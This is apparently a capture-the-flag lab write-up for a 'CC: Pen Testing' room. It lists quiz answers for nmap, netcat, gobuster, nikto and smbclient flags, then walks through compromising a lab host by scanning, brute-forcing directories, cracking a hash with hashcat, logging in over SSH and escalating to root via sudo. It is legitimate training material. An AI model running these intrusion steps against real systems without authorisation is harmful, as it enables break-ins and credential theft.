# CC: Pen Testing

## :map: Nmap

### #1 **What does nmap stand for?**

```
Network Mapper
```

### **#2 How do you specify which port(s) to scan?**

```
-p
```

### **#3 How do you do a "ping scan"(just tests if the host(s) is up)?**

```
-sn
```

### #4 **What is the flag for a UDP scan?**&#x20;

```
-sU
```

### #5 **How do you run default scripts?**

```
-sC
```

### #6 **How do you enable "aggressive mode"(Enables OS detection, version detection, script scanning, and traceroute)**

```
-A
```

### #7 **What flag enables OS detection**

```
-O
```

### **#8 do you get the versions of services running on the target machine** &#x20;

```
-sV
```

### #10 **How many ports are open on the machine?**

```
sudo nmap 10.10.188.241
```

![](<../../.gitbook/assets/Screenshot from 2020-08-28 13-12-11.png>)

### #11 **What service is running on the machine?**&#x20;

```
sudo nmap -sV -p80 10.10.188.241
```

![](<../../.gitbook/assets/Screenshot from 2020-08-28 13-13-20.png>)

### **#12 What is the version of the service?**

```
2.4.18
```

### #13 **What is the output of the http-title script**

```
sudo nmap -p80 --script http-title 10.10.188.241
```

![](<../../.gitbook/assets/Screenshot from 2020-08-28 13-14-34.png>)

### :cat: Netcat

### #1 **How do you listen for connections?**

```
-l
```

### #2 **How do you enable verbose mode?**

```
-v
```

### #3 **How do you specify a port to listen on**

```
-p
```

### #4 **How do you specify which program to execute after you connect to a host?**

```
-e
```

### #5 **How do you connect to udp ports**

```
-u
```

## :punch: gobuster

### #1 **How do you specify directory/file brute forcing mode?**

```
dir
```

### #2 **How do you specify dns bruteforcing mode?**   &#x20;

```
dns
```

### #3 **What flag sets extensions to be used?**

```
-x
```

### #4 **What flag sets a wordlist to be used?**

```
-w
```

### &#x20;#5 **How do you set the Username for basic authentication?**

```
-U
```

### #6 **How do you set the password for basic authentication?**

```
-P
```

### #7 **How do you set which status codes gobuster will interpret as valid?**

```
-s
```

### #8 **How do you skip ssl certificate verification?**

```
-k
```

### #9 **How do you specify a User-Agent?**

```
-a
```

### #10 **How do you specify a HTTP header?**

```
-H
```

### #11 **What flag sets the URL to bruteforce?**

```
-u
```

### #13 **What is the name of the hidden directory**

```bash
gobuster dir -u http://10.10.78.54 \
             -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt \
             -t 64
```

![](<../../.gitbook/assets/Screenshot from 2020-08-28 13-34-30.png>)

### #14 **What is the name of the hidden file with the extension xxa**

```
gobuster dir -u http://10.10.78.54 \
             -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt \
             -x xxa -t 64
```

![](<../../.gitbook/assets/Screenshot from 2020-08-28 13-35-54.png>)

## :camera: nikto

### **#1 How do you specify which host to use?**  &#x20;

```
-h
```

### #2 **What flag disables ssl?**

```
-nossl
```

### #3 **How do you force ssl?**

```
-ssl
```

### #4 **How do you specify authentication?**

```
-id
```

### #5 **How do you select which plugin to use?**

```
-Plugins
```

### #6 **Which plugin checks if you can enumerate apache users?**&#x20;

```
apacheusers
```

### #7 **How do you update the plugin list**&#x20;

```
-update
```

### #8 **How do you list all possible plugins to use**

```
-list-plugins
```

## :dancer: smbclient

### #1 **How do you specify which domain(workgroup) to use when connecting to the host?**

```
-W
```

### #2 **How do you specify the ip address of the host?**

```
-I
```

### #3 **How do you run the command "ipconfig" on the target machine?**

```
-c "ipconfig"
```

### #4 **How do you specify the username to authenticate with?**

```
-U
```

### #5 **How do you specify the password to authenticate with?**

```
-P
```

### #6 **What flag is set to tell smbclient to not use a password?**

```
-N
```

### #7 **While in the interactive prompt, how would you download the file test, assuming it was in the current directory?**

```
get test
```

### #8 **In the interactive prompt, how would you upload your /etc/hosts file**

```
put /etc/hosts
```

## :scream: Final Exam

### #1 **What is the user.txt**

```
sudo nmap 10.10.45.5
gobuster -u http://10.10.45.5 \
         -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt \
         -t 64
gobuster -u http://10.10.45.5 \
         -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt \
         -t 64 -x txt,php,bak
```

![](<../../.gitbook/assets/Screenshot from 2020-08-28 14-01-26.png>)

![](<../../.gitbook/assets/Screenshot from 2020-08-28 14-12-01.png>)

![](<../../.gitbook/assets/Screenshot from 2020-08-28 14-12-46.png>)

```
echo -n '046385855FC9580393853D8E81F240B66FE9A7B8' > sha1.txt
hashcat -a 0 -m 0 sha1.txt /usr/share/wordlists/rockyou.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-08-28 14-15-28.png>)

```
ssh nyan@10.10.45.5
cat user.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-08-28 14-16-14.png>)

### #2 **What is the root.txt**

```
sudo -l
sudo /bin/su -
cat /root.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-08-28 14-21-29.png>)

## Support Material

{% embed url="https://github.com/sullo/nikto/wiki/Plugin-list" %}

{% embed url="https://github.com/SecureAuthCorp/impacket" %}

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings" %}

{% embed url="https://github.com/diego-treitos/linux-smart-enumeration" %}

{% embed url="https://github.com/mzet-/linux-exploit-suggester" %}

{% embed url="https://gtfobins.github.io/" %}

{% embed url="https://www.fuzzysecurity.com/tutorials/16.html" %}

{% embed url="https://github.com/411Hall/JAWS" %}

